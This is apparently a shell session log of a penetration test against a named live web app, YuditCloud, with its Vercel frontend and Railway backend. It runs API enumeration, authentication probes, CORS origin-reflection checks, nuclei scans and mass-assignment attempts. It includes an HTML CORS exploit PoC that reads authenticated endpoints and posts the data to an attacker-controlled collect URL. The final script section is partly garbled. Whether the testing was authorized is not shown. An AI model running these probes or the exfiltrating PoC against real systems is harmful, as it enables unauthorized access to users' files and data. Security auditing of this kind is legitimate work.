+DELETE /share/{file_id}
+GET /
+GET /assignments/file/{file_id}
+GET /assignments/my
+GET /assignments/user/{user_id}
+GET /categories/
+GET /collaborators/
+GET /conversions/files/{file_id}/lineage
+GET /conversions/jobs
+GET /conversions/operations
+GET /cors-check
+GET /docs/{file_id}
+GET /docs/{file_id}/google-doc-info
+GET /docs/{file_id}/raw
+GET /docs/{file_id}/versions
+GET /docs/{file_id}/versions/{version_number}
+GET /drives/
+GET /drives/pool
+GET /files/
+GET /files/categories
+GET /files/{file_id}/download
+GET /files/{file_id}/preview
+GET /files/monthly-folders
+GET /files/stats
+GET /folders/
+GET /health
+GET /notifications/health
+GET /oauth/google/callback
+GET /oauth/google/connect
+GET /share/{token}/download
+GET /share/{token}/info
+GET /share/{token}/preview
+PATCH /categories/{category_id}
+PATCH /collaborators/{user_id}
+PATCH /docs/{file_id}
+PATCH /files/{file_id}/category
+POST /assignments/
+POST /auth/change-password
+POST /auth/login
+POST /auth/register
+POST /categories/
+POST /collaborators/
+POST /conversions/
+POST /docs/{file_id}/convert-to-gdoc
+POST /docs/{file_id}/sync-from-gdoc
+POST /docs/{file_id}/upload-image
+POST /docs/{file_id}/versions/{version_number}/restore
+POST /drives/refresh-quota
+POST /files/bulk-category
+POST /files/bulk-delete
+POST /files/{file_id}/reclassify
+POST /files/upload
+POST /folders/
+POST /notifications/cron/drive-health-check
+POST /notifications/cron/monthly-report
+POST /share/create
+=== Endpoint tanpa security (public) ===
+GET /
+GET /conversions/operations
+GET /cors-check
+GET /health
+GET /oauth/google/callback
+GET /share/{token}/download
+GET /share/{token}/info
+GET /share/{token}/preview
+POST /auth/login
+POST /auth/register
+POST /notifications/cron/drive-health-check
+POST /notifications/cron/monthly-report
+=== Endpoint dengan security ===
+DELETE /assignments/{assignment_id} [{"HTTPBearer":[]}]
+DELETE /categories/{category_id} [{"HTTPBearer":[]}]
+DELETE /collaborators/{user_id} [{"HTTPBearer":[]}]
+DELETE /docs/{file_id}/google-doc [{"HTTPBearer":[]}]
+DELETE /drives/{drive_id} [{"HTTPBearer":[]}]
+DELETE /files/{file_id} [{"HTTPBearer":[]}]
+DELETE /folders/{folder_id} [{"HTTPBearer":[]}]
+DELETE /share/{file_id} [{"HTTPBearer":[]}]
+GET /assignments/file/{file_id} [{"HTTPBearer":[]}]
+GET /assignments/my [{"HTTPBearer":[]}]
+GET /assignments/user/{user_id} [{"HTTPBearer":[]}]
+GET /categories/ [{"HTTPBearer":[]}]
+GET /collaborators/ [{"HTTPBearer":[]}]
+GET /conversions/files/{file_id}/lineage [{"HTTPBearer":[]}]
+GET /conversions/jobs [{"HTTPBearer":[]}]
+GET /docs/{file_id}/google-doc-info [{"HTTPBearer":[]}]
+GET /docs/{file_id} [{"HTTPBearer":[]}]
+GET /docs/{file_id}/raw [{"HTTPBearer":[]}]
+GET /docs/{file_id}/versions [{"HTTPBearer":[]}]
+GET /docs/{file_id}/versions/{version_number} [{"HTTPBearer":[]}]
+GET /drives/ [{"HTTPBearer":[]}]
+GET /drives/pool [{"HTTPBearer":[]}]
+GET /files/categories [{"HTTPBearer":[]}]
+GET /files/{file_id}/download [{"HTTPBearer":[]}]
+GET /files/{file_id}/preview [{"HTTPBearer":[]}]
+GET /files/ [{"HTTPBearer":[]}]
+GET /files/monthly-folders [{"HTTPBearer":[]}]
+GET /files/stats [{"HTTPBearer":[]}]
+GET /folders/ [{"HTTPBearer":[]}]
+GET /notifications/health [{"HTTPBearer":[]}]
+GET /oauth/google/connect [{"HTTPBearer":[]}]
+PATCH /categories/{category_id} [{"HTTPBearer":[]}]
+PATCH /collaborators/{user_id} [{"HTTPBearer":[]}]
+PATCH /docs/{file_id} [{"HTTPBearer":[]}]
+PATCH /files/{file_id}/category [{"HTTPBearer":[]}]
+POST /assignments/ [{"HTTPBearer":[]}]
+POST /auth/change-password [{"HTTPBearer":[]}]
+POST /categories/ [{"HTTPBearer":[]}]
+POST /collaborators/ [{"HTTPBearer":[]}]
+POST /conversions/ [{"HTTPBearer":[]}]
+POST /docs/{file_id}/convert-to-gdoc [{"HTTPBearer":[]}]
+POST /docs/{file_id}/sync-from-gdoc [{"HTTPBearer":[]}]
+POST /docs/{file_id}/upload-image [{"HTTPBearer":[]}]
+POST /docs/{file_id}/versions/{version_number}/restore [{"HTTPBearer":[]}]
+POST /drives/refresh-quota [{"HTTPBearer":[]}]
+POST /files/bulk-category [{"HTTPBearer":[]}]
+POST /files/bulk-delete [{"HTTPBearer":[]}]
+POST /files/{file_id}/reclassify [{"HTTPBearer":[]}]
+POST /files/upload [{"HTTPBearer":[]}]
+POST /folders/ [{"HTTPBearer":[]}]
+POST /share/create [{"HTTPBearer":[]}]
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ jq -r '.paths | to_entries[] | .key as $path | .value | to_entries[] |
+  select(.value.parameters != null) |
+  "\(.key | ascii_upcase) \($path)\n" +
+  (.value.parameters | map("  - \(.name) (\(.in)) required=\(.required // false) type=\(.schema.type // "?")\n") | join(""))' \
+  api/openapi.json > api/openapi-params.txt
+cat api/openapi-params.txt
+GET /oauth/google/callback
+  - code (query) required=true type=string
+  - state (query) required=true type=string
+
+DELETE /drives/{drive_id}
+  - drive_id (path) required=true type=string
+  - force (query) required=false type=boolean
+
+GET /files/
+  - folder_id (query) required=false type=?
+  - category (query) required=false type=?
+  - search (query) required=false type=?
+  - year (query) required=false type=?
+  - month (query) required=false type=?
+  - day (query) required=false type=?
+  - date_from (query) required=false type=?
+  - date_to (query) required=false type=?
+  - file_type (query) required=false type=?
+  - sort_by (query) required=false type=string
+  - sort_order (query) required=false type=string
+
+GET /files/stats
+  - year (query) required=false type=?
+
+GET /files/{file_id}/download
+  - file_id (path) required=true type=string
+
+GET /files/{file_id}/preview
+  - file_id (path) required=true type=string
+
+DELETE /files/{file_id}
+  - file_id (path) required=true type=string
+
+PATCH /files/{file_id}/category
+  - file_id (path) required=true type=string
+
+POST /files/{file_id}/reclassify
+  - file_id (path) required=true type=string
+
+DELETE /folders/{folder_id}
+  - folder_id (path) required=true type=string
+
+DELETE /share/{file_id}
+  - file_id (path) required=true type=string
+
+GET /share/{token}/info
+  - token (path) required=true type=string
+
+GET /share/{token}/download
+  - token (path) required=true type=string
+  - password (query) required=false type=?
+
+GET /share/{token}/preview
+  - token (path) required=true type=string
+  - password (query) required=false type=?
+
+GET /docs/{file_id}
+  - file_id (path) required=true type=string
+
+PATCH /docs/{file_id}
+  - file_id (path) required=true type=string
+
+GET /docs/{file_id}/versions
+  - file_id (path) required=true type=string
+
+GET /docs/{file_id}/versions/{version_number}
+  - file_id (path) required=true type=string
+  - version_number (path) required=true type=integer
+
+POST /docs/{file_id}/versions/{version_number}/restore
+  - file_id (path) required=true type=string
+  - version_number (path) required=true type=integer
+
+GET /docs/{file_id}/raw
+  - file_id (path) required=true type=string
+
+POST /docs/{file_id}/convert-to-gdoc
+  - file_id (path) required=true type=string
+
+GET /docs/{file_id}/google-doc-info
+  - file_id (path) required=true type=string
+
+POST /docs/{file_id}/sync-from-gdoc
+  - file_id (path) required=true type=string
+
+DELETE /docs/{file_id}/google-doc
+  - file_id (path) required=true type=string
+
+POST /docs/{file_id}/upload-image
+  - file_id (path) required=true type=string
+
+PATCH /categories/{category_id}
+  - category_id (path) required=true type=string
+
+DELETE /categories/{category_id}
+  - category_id (path) required=true type=string
+
+GET /conversions/jobs
+  - limit (query) required=false type=integer
+
+GET /conversions/files/{file_id}/lineage
+  - file_id (path) required=true type=string
+
+PATCH /collaborators/{user_id}
+  - user_id (path) required=true type=string
+
+DELETE /collaborators/{user_id}
+  - user_id (path) required=true type=string
+
+GET /assignments/file/{file_id}
+  - file_id (path) required=true type=string
+
+GET /assignments/user/{user_id}
+  - user_id (path) required=true type=string
+
+DELETE /assignments/{assignment_id}
+  - assignment_id (path) required=true type=string
+
+POST /notifications/cron/monthly-report
+  - year (query) required=false type=?
+  - month (query) required=false type=?
+  - X-Cron-Secret (header) required=false type=?
+
+POST /notifications/cron/drive-health-check
+  - X-Cron-Secret (header) required=false type=?
+
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ jq '.components.schemas' api/openapi.json > api/openapi-schemas.json
+jq -r '.components.schemas | keys[]' api/openapi.json
+AssignIn
+Body_upload_files_upload_post
+Body_upload_image_docs__file_id__upload_image_post
+BulkCategoryIn
+BulkDeleteIn
+CategoryIn
+ChangePasswordIn
+ConvertIn
+ConvertToGDocIn
+FolderIn
+HTTPValidationError
+InviteIn
+SaveDocIn
+ShareCreateIn
+ShareCreateOut
+ShareInfoOut
+UpdateCollabIn
+UserCreate
+UserLogin
+ValidationError
+app__routers__categories__CategoryUpdateIn
+app__routers__files__CategoryUpdateIn
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ jq -r '.paths | to_entries[] | .key as $p | .value | to_entries[] |
+  select($p | test("admin|auth|user|share|upload|drive|file|oauth|password|token"; "i")) |
+  "\(.key | ascii_upcase) \($p)"' api/openapi.json | sort
+DELETE /collaborators/{user_id}
+DELETE /docs/{file_id}/google-doc
+DELETE /drives/{drive_id}
+DELETE /files/{file_id}
+DELETE /share/{file_id}
+GET /assignments/file/{file_id}
+GET /assignments/user/{user_id}
+GET /conversions/files/{file_id}/lineage
+GET /docs/{file_id}
+GET /docs/{file_id}/google-doc-info
+GET /docs/{file_id}/raw
+GET /docs/{file_id}/versions
+GET /docs/{file_id}/versions/{version_number}
+GET /drives/
+GET /drives/pool
+GET /files/
+GET /files/categories
+GET /files/{file_id}/download
+GET /files/{file_id}/preview
+GET /files/monthly-folders
+GET /files/stats
+GET /oauth/google/callback
+GET /oauth/google/connect
+GET /share/{token}/download
+GET /share/{token}/info
+GET /share/{token}/preview
+PATCH /collaborators/{user_id}
+PATCH /docs/{file_id}
+PATCH /files/{file_id}/category
+POST /auth/change-password
+POST /auth/login
+POST /auth/register
+POST /docs/{file_id}/convert-to-gdoc
+POST /docs/{file_id}/sync-from-gdoc
+POST /docs/{file_id}/upload-image
+POST /docs/{file_id}/versions/{version_number}/restore
+POST /drives/refresh-quota
+POST /files/bulk-category
+POST /files/bulk-delete
+POST /files/{file_id}/reclassify
+POST /files/upload
+POST /notifications/cron/drive-health-check
+POST /share/create
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # Lihat schema register & login
+jq '.paths."/auth/register", .paths."/auth/login"' api/openapi.json
+{
+  "post": {
+    "tags": [
+      "Auth"
+    ],
+    "summary": "Register",
+    "description": "Registrasi user baru (role=owner workspace sendiri).\n\nValidasi:\n- Email harus unik → 400 \"Email sudah terdaftar\"\n- Username harus unik → 400 \"Username sudah dipakai\"\n\nFrontend sebaiknya handle 400 dengan pesan yang spesifik\ndan auto-switch ke tab login kalau email sudah ada.",
+    "operationId": "register_auth_register_post",
+    "requestBody": {
+      "content": {
+        "application/json": {
+          "schema": {
+            "$ref": "#/components/schemas/UserCreate"
+          }
+        }
+      },
+      "required": true
+    },
+    "responses": {
+      "200": {
+        "description": "Successful Response",
+        "content": {
+          "application/json": {
+            "schema": {}
+          }
+        }
+      },
+      "422": {
+        "description": "Validation Error",
+        "content": {
+          "application/json": {
+            "schema": {
+              "$ref": "#/components/schemas/HTTPValidationError"
+            }
+          }
+        }
+      }
+    }
+  }
+}
+{
+  "post": {
+    "tags": [
+      "Auth"
+    ],
+    "summary": "Login",
+    "operationId": "login_auth_login_post",
+    "requestBody": {
+      "content": {
+        "application/json": {
+          "schema": {
+            "$ref": "#/components/schemas/UserLogin"
+          }
+        }
+      },
+      "required": true
+    },
+    "responses": {
+      "200": {
+        "description": "Successful Response",
+        "content": {
+          "application/json": {
+            "schema": {}
+          }
+        }
+      },
+      "422": {
+        "description": "Validation Error",
+        "content": {
+          "application/json": {
+            "schema": {
+              "$ref": "#/components/schemas/HTTPValidationError"
+            }
+          }
+        }
+      }
+    }
+  }
+}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# 1. Register
+REG_EMAIL="pentest-$(date +%s)@example.com"
+REG_PASS="Pentest123!@#"
+
+echo "=== Register: $REG_EMAIL ==="
+curl -sS -X POST "$BE/auth/register" \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"$REG_EMAIL\",\"password\":\"$REG_PASS\",\"name\":\"Pentest User\"}" \
+  -w '\n[HTTP %{http_code}]\n' | tee api/register-response.txt
+
+# 2. Login
+echo "=== Login ==="
+curl -sS -X POST "$BE/auth/login" \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"$REG_EMAIL\",\"password\":\"$REG_PASS\"}" \
+  -w '\n[HTTP %{http_code}]\n' -o api/login-response.json
+
+cat api/login-response.json | jq . 2>/dev/null || cat api/login-response.json
+
+# 3. Extract token (coba berbagai nama field)
+TOKEN=$(jq -r '.token // .access_token // .accessToken // .jwt // .data.token // .data.access_token // empty' api/login-response.json 2>/dev/null)
+echo "=== Token: ${TOKEN:0:80}... ==="
+echo "$TOKEN" > api/token.txt
+
+# 4. Decode JWT
+if [[ "$TOKEN" == *"."* ]]; then
+  echo "=== JWT Header ==="
+  echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
+  echo "=== JWT Payload ==="
+  echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
+fi
+bash: !@#: event not found
+=== Register: pentest-1793783380@example.com ===
+{"detail":[{"type":"missing","loc":["body","username"],"msg":"Field required","input":{"email":"pentest-1793783380@example.com","password":"","name":"Pentest User"}}]}
+[HTTP 422]
+=== Login ===
+
+[HTTP 401]
+{
+  "detail": "Email atau password salah"
+}
+=== Token: ... ===
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt)
+
+# Test semua endpoint GET dari OpenAPI
+jq -r '.paths | to_entries[] | .key as $p | .value | keys[] |
+  select(. == "get") | $p' api/openapi.json | sort -u > api/all-get-paths.txt
+
+echo "=== Testing $(wc -l < api/all-get-paths.txt) GET endpoints ==="
+: > api/auth-test-results.txt
+while read -r path; do
+  # Replace {param} dengan 1
+  real_path=$(echo "$path" | sed 's/{[^}]*}/1/g')
+  code=$(curl -sS -o /tmp/ar -w '%{http_code}' \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Cookie: session=$TOKEN" \
+    "$BE$real_path")
+  size=$(wc -c < /tmp/ar)
+  printf '%-45s → %s (%s bytes)\n' "$real_path" "$code" "$size" | tee -a api/auth-test-results.txt
+done < api/all-get-paths.txt
+=== Testing 31 GET endpoints ===
+/                                             → 200 (34 bytes)
+/assignments/file/1                           → 401 (30 bytes)
+/assignments/my                               → 401 (30 bytes)
+/assignments/user/1                           → 401 (30 bytes)
+/categories/                                  → 401 (30 bytes)
+/collaborators/                               → 401 (30 bytes)
+/conversions/files/1/lineage                  → 401 (30 bytes)
+/conversions/jobs                             → 401 (30 bytes)
+/conversions/operations                       → 200 (1631 bytes)
+/cors-check                                   → 200 (303 bytes)
+/docs/1                                       → 401 (30 bytes)
+/docs/1/google-doc-info                       → 401 (30 bytes)
+/docs/1/raw                                   → 401 (30 bytes)
+/docs/1/versions                              → 401 (30 bytes)
+/docs/1/versions/1                            → 401 (30 bytes)
+/drives/                                      → 401 (30 bytes)
+/drives/pool                                  → 401 (30 bytes)
+/files/                                       → 401 (30 bytes)
+/files/categories                             → 401 (30 bytes)
+/files/1/download                             → 401 (30 bytes)
+/files/1/preview                              → 401 (30 bytes)
+/files/monthly-folders                        → 401 (30 bytes)
+/files/stats                                  → 401 (30 bytes)
+/folders/                                     → 401 (30 bytes)
+/health                                       → 200 (20 bytes)
+/notifications/health                         → 401 (30 bytes)
+/oauth/google/callback                        → 422 (169 bytes)
+/oauth/google/connect                         → 401 (30 bytes)
+/share/1/download                             → 500 (34 bytes)
+/share/1/info                                 → 500 (34 bytes)
+/share/1/preview                              → 500 (34 bytes)
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ BE="https://web-production-c8591.up.railway.app"
+
+# Simulasi browser korban (dengan cookie/token user)
+TOKEN=$(cat api/token.txt)
+
+echo "=== Simulasi CORS attack: baca /files/ sebagai attacker.vercel.app ==="
+curl -sS -D /tmp/cors-headers.txt \
+  -H "Origin: https://attacker.vercel.app" \
+  -H "Authorization: Bearer $TOKEN" \
+  "$BE/files/" -o /tmp/cors-files.json
+
+echo "=== Response headers (harus ada allow-origin: attacker.vercel.app) ==="
+grep -i access-control /tmp/cors-headers.txt
+
+echo "=== Response body ==="
+head -c 500 /tmp/cors-files.json; echo
+
+echo "=== X-Drive leak headers ==="
+grep -i x-drive /tmp/cors-headers.txt
+=== Simulasi CORS attack: baca /files/ sebagai attacker.vercel.app ===
+=== Response headers (harus ada allow-origin: attacker.vercel.app) ===
+access-control-allow-credentials: true
+access-control-allow-origin: https://attacker.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+=== Response body ===
+{"detail":"Not authenticated"}
+=== X-Drive leak headers ===
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cat > exploit/cors-poc.html <<'EOF'
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC — YuditCloud</title></head>
+<body>
+<h1>CORS Exploit PoC</h1>
+<p>Status: <span id="s">running...</span></p>
+<pre id="out"></pre>
+
+<script>
+const BE = 'https://web-production-c8591.up.railway.app';
+const endpoints = ['/files/', '/drives/', '/collaborators/', '/assignments/my', '/conversions/jobs'];
+let results = [];
+
+(async () => {
+  for (const ep of endpoints) {
+    try {
+      const r = await fetch(BE + ep, {
+        credentials: 'include',
+        headers: { 'Accept': 'application/json' }
+      });
+      const text = await r.text();
+      results.push({ endpoint: ep, status: r.status, size: text.length, data: text.substring(0, 500) });
+    } catch (e) {
+      results.push({ endpoint: ep, error: String(e) });
+    }
+  }
+  document.getElementById('s').textContent = 'DONE';
+  document.getElementById('out').textContent = JSON.stringify(results, null, 2);
+  // Exfiltrate
+  fetch('https://attacker.vercel.app/collect', {
+    method: 'POST',
+    body: JSON.stringify(results)
+  }).catch(()=>{});
+echo "PoC: exploit/cors-poc.html"
+PoC: exploit/cors-poc.html
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # Cari schema yang menerima additional properties
+jq -r '.components.schemas | to_entries[] |
+  select(.value.additionalProperties == true) | .key' api/openapi.json
+
+# Cari schema User — field sensitive
+jq '.components.schemas.User // .components.schemas.user // .components.schemas.UserResponse' api/openapi.json
+null
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+
+# Scan backend Railway
+nuclei -u "$BE" -tags exposure,cors,misconfig,railway,api \
+  -severity low,medium,high,critical \
+  -o report/nuclei-be.txt
+
+# Scan OpenAPI spec — nuclei punya template openapi detection
+nuclei -u "$BE/openapi.json" -tags swagger,openapi,api \
+  -o report/nuclei-openapi.txt
+
+# Custom: cek CORS dengan template
+cat > /tmp/cors-template.yaml <<'EOF'
+id: cors-reflect-credentials
+info:
+  name: CORS Origin Reflect + Credentials
+  severity: high
+  author: pentest
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/health"
+    headers:
+      Origin: "https://attacker.vercel.app"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "access-control-allow-origin: https://attacker.vercel.app"
+          - "access-control-allow-credentials: true"
+        condition: and
+EOF
+nuclei -u "$BE" -t /tmp/cors-template.yaml -o report/cors-confirmed.txt
+cat report/cors-confirmed.txt
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.1
+
+		projectdiscovery.io
+
+[INF] Current nuclei version: v3.11.1 (latest)
+[INF] Current nuclei-templates version: v10.5.1 (latest)
+[INF] New templates added in latest release: 68
+[INF] Templates loaded for current scan: 1518
+[INF] Executing 1518 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 310 (Reduced 269 Requests)
+[INF] Using Interactsh Server: oast.me
+[INF] Scan completed in 42.49275925s. 0 matches found.
+[INF] HTTP connections: 3926 total, 541 new, 3385 reused (86.2%)
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.1
+
+		projectdiscovery.io
+
+[INF] Current nuclei version: v3.11.1 (latest)
+[INF] Current nuclei-templates version: v10.5.1 (latest)
+[INF] New templates added in latest release: 68
+[INF] Templates loaded for current scan: 65
+[INF] Executing 65 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 10 (Reduced 4 Requests)
+[INF] Using Interactsh Server: oast.me
+[INF] Scan completed in 15.703649474s. 0 matches found.
+[INF] HTTP connections: 174 total, 70 new, 104 reused (59.8%)
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.1
+
+		projectdiscovery.io
+
+[WRN] Found 1 templates loaded with deprecated protocol syntax, update before v3 for continued support.
+[INF] Current nuclei version: v3.11.1 (latest)
+[INF] Current nuclei-templates version: v10.5.1 (latest)
+[INF] New templates added in latest release: 68
+[INF] Templates loaded for current scan: 1
+[INF] Targets loaded for current scan: 1
+[INF] Scan completed in 504.745992ms. No results found.
+[INF] HTTP connections: 1 total, 1 new, 0 reused (0.0%)
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # Lihat schema register
+jq '.paths."/auth/register".post.requestBody' api/openapi.json
+
+# Cari schema user
+jq '.components.schemas | to_entries[] | select(.key | test("user|register|signup";"i"))' \
+  api/openapi.json > api/user-schemas.json
+cat api/user-schemas.json
+{
+  "content": {
+    "application/json": {
+      "schema": {
+        "$ref": "#/components/schemas/UserCreate"
+      }
+    }
+  },
+  "required": true
+}
+{
+  "key": "UserCreate",
+  "value": {
+    "properties": {
+      "email": {
+        "type": "string",
+        "format": "email",
+        "title": "Email"
+      },
+      "username": {
+        "type": "string",
+        "title": "Username"
+      },
+      "password": {
+        "type": "string",
+        "title": "Password"
+      }
+    },
+    "type": "object",
+    "required": [
+      "email",
+      "username",
+      "password"
+    ],
+    "title": "UserCreate"
+  }
+}
+{
+  "key": "UserLogin",
+  "value": {
+    "properties": {
+      "email": {
+        "type": "string",
+        "format": "email",
+        "title": "Email"
+      },
+      "password": {
+        "type": "string",
+        "title": "Password"
+      }
+    },
+    "type": "object",
+    "required": [
+      "email",
+      "password"
+    ],
+    "title": "UserLogin"
+  }
+}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ BE="https://web-production-c8591.up.railway.app"
+for role in admin superadmin root isAdmin:true plan:enterprise verified:true credits:99999; do
+  curl -sS -X POST "$BE/auth/register" \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"ma-$(date +%s%N)@x.com\",\"password\":\"Pass123!\",\"$role\"}" \
+    -w "  $role → %{http_code}\n" -o /tmp/mr
+  head -c 200 /tmp/mr; echo
+done
+bash: !\: event not found
+  admin → 422
+{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}
+  superadmin → 422
+{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}
+  root → 422
+{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}
+  isAdmin:true → 422
+{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}
+  plan:enterprise → 422
+{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}
+  verified:true → 422
+{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}
+  credits:99999 → 422
+{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ export PATH="$HOME/go/bin:$PATH"
+nuclei -update-templates
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.1
+
+		projectdiscovery.io
+
+[INF] No new updates found for nuclei templates
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# Test origin reflect
+for o in "https://evil.com" "https://attacker.vercel.app" "null" "http://localhost:3000"; do
+  echo "=== Origin: $o ==="
+  curl -sS -I -H "Origin: $o" "$BE/health" | grep -iE 'access-control-allow-(origin|credentials)'
+done
+=== Origin: https://evil.com ===
+access-control-allow-credentials: true
+=== Origin: https://attacker.vercel.app ===
+access-control-allow-credentials: true
+access-control-allow-origin: https://attacker.vercel.app
+=== Origin: null ===
+access-control-allow-credentials: true
+=== Origin: http://localhost:3000 ===
+access-control-allow-credentials: true
+access-control-allow-origin: http://localhost:3000
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ for sub in api app admin web prod dev staging; do
+  h="$sub-production-c8591.up.railway.app"
+  code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "https://$h/health")
+  echo "$h → $code"
+done
+api-production-c8591.up.railway.app → 404
+app-production-c8591.up.railway.app → 404
+admin-production-c8591.up.railway.app → 404
+web-production-c8591.up.railway.app → 200
+prod-production-c8591.up.railway.app → 404
+dev-production-c8591.up.railway.app → 404
+staging-production-c8591.up.railway.app → 404
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ curl -sS "https://web-production-c8591.up.railway.app/" | head -100
+{"app":"YuditCloud","status":"ok"}pathoskratos@pathos:~/Documents/audit-clouddatadprd$ for p in / /docs /swagger /swagger.json /openapi.json /api-docs /redoc /health /vpathoskratos@pathos:~/Documents/audit-clouddatadprd$ for p in / /docs /swagger /swagger.json /openapi.json /api-docs /redoc /health /version /metrics; do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' "https://web-production-c8591.up.railway.app$p")
+  [ "$code" != "404" ] && echo "$p → $code ($(wc -c < /tmp/r) bytes)"
+done
+/ → 200 (34 bytes)
+/docs → 200 (1009 bytes)
+/openapi.json → 200 (40129 bytes)
+/redoc → 200 (891 bytes)
+/health → 200 (20 bytes)
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ #!/usr/bin/env bash
+# =============================================================================
+# PENTEST MASTER — DPRD Cloud
+# Target: clouddatadprd.vercel.app + web-production-c8591.up.railway.app
+# Jalankan dari: ~/Documents/audit-clouddatadprd
+# =============================================================================
+set -uo pipefail
+
+# --- 0. SETUP WORKDIR (anti-error path) ---
+BASE="$HOME/Documents/audit-clouddatadprd"
+mkdir -p "$BASE"/{recon,http/js,api,report,exploit,logs}
+cd "$BASE" || { echo "FATAL: cannot cd $BASE"; exit 1; }
+
+FE="https://clouddatadprd.vercel.app"
+BE="https://web-production-c8591.up.railway.app"
+TS=$(date +%Y%m%d-%H%M%S)
+LOG="logs/master-$TS.log"
+exec > >(tee -a "$LOG") 2>&1
+
+echo "================================================================"
+echo " PENTEST MASTER — $TS"
+echo " Workdir: $BASE"
+echo " FE: $FE"
+echo " BE: $BE"
+echo "================================================================"
+
+# --- helper ---
+hr(){ echo; echo "──────── $* ────────"; }
+code(){ curl -sS -o /tmp/body.out -w '%{http_code}' --max-time 10 "$@"; }
+
+# =============================================================================
+# FASE 1 — RECON
+# =============================================================================
+hr "FASE 1: RECON"
+
+echo "[1.1] DNS"
+echo "📋 Log:      $LOG"n: report/FINAL-$TS.md"vars.txt 2>/dev/null============tdiscovery/nuclei/v3/cmd/nuclei@latest)"meta-data/"}\r\n------X--' \
+================================================================
+ PENTEST MASTER — 20261104-160116
+ Workdir: /home/pathoskratos/Documents/audit-clouddatadprd
+ FE: https://clouddatadprd.vercel.app
+ BE: https://web-production-c8591.up.railway.app
+================================================================
+
+──────── FASE 1: RECON ────────
+[1.1] DNS
+64.29.17.67
+69.46.46.26
+[1.2] Frontend headers
+HTTP/2 200 
+accept-ranges: bytes
+access-control-allow-origin: *
+age: 23841
+cache-control: public, max-age=0, must-revalidate
+content-disposition: inline
+content-type: text/html; charset=utf-8
+date: Wed, 04 Nov 2026 09:01:19 GMT
+etag: "1436578a748c4c4f6a231de60db37c9b"
+permissions-policy: camera=(), microphone=(), geolocation=()
+referrer-policy: strict-origin-when-cross-origin
+server: Vercel
+strict-transport-security: max-age=63072000; includeSubDomains; preload
+vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-matched-path: /
+x-nextjs-prerender: 1
+x-nextjs-stale-time: 300
+x-vercel-cache: HIT
+x-vercel-id: sin1::bbthc-1793782879044-61e51d027a6c
+content-length: 15221
+
+[1.3] Backend headers
+HTTP/2 405 
+allow: GET
+content-type: application/json
+date: Wed, 04 Nov 2026 09:01:20 GMT
+server: railway-hikari
+vary: Origin
+x-railway-request-id: TUZE5YNqTIqbxi14g4a9AQ
+content-length: 31
+x-hikari-trace: sin1.hs0s
+x-railway-edge: sin1
+
+[1.4] Subdomain (subfinder)
+
+0 recon/subs-subfinder.txt
+[1.5] Cek Railway subdomain alt
+api-production-c8591.up.railway.app → 69.46.46.71
+app-production-c8591.up.railway.app → 69.46.46.47
